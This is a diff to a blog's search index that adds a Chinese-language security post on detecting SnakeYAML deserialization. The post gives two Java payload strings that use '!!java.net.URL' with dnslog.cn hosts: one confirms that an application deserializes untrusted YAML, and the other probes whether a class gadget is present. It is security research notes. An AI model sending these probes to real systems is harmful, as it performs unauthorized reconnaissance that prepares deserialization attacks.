@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>SnakeYAML实现Gadget探测</title>
+      <link href="/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/"/>
+      <url>/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SnakeYAML实现Gadget探测"><a href="#SnakeYAML实现Gadget探测" class="headerlink" title="SnakeYAML实现Gadget探测"></a>SnakeYAML实现Gadget探测</h1><p>今天在学习SnakeYAML的反序列化的时候，想到一个新的探测payload，网上之前有一个SPI那个链子可以有通过URLClassloader检测 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;!!java.net.URL [null, \&quot;[http://osrwbf.dnslog.cn](http://osrwbf.dnslog.cn/)\&quot;]: 1&quot;</span>;</span><br></pre></td></tr></table></figure><p> 这个的话主要是因为SnakeYAML在解析带键值对的集合的时候会对键调用hashCode方法因此会触发DNS解析，</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/1.png"></p><p>因此通过构造URL对象后面简单加个: 1让他成为一个mapping ，不过会触发多次</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/2.png"></p><p>这里再补充个探测gadget思路：：在刚刚的思路上实现了探测gadget，如果string存在才会接着触发URLDNS，不存在就不会 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;key: [!!java.lang.String []: 0, !!java.net.URL [null, \&quot;[http://5ydl3f.dnslog.cn](http://5ydl3f.dnslog.cn/)\&quot;]: 1]&quot;</span>;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Java </tag>
+            
+            <tag> SnakeYAML </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SnakeYAML反序列化及可利用Gadget</title>
       <link href="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/"/>
       <url>/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/</url>
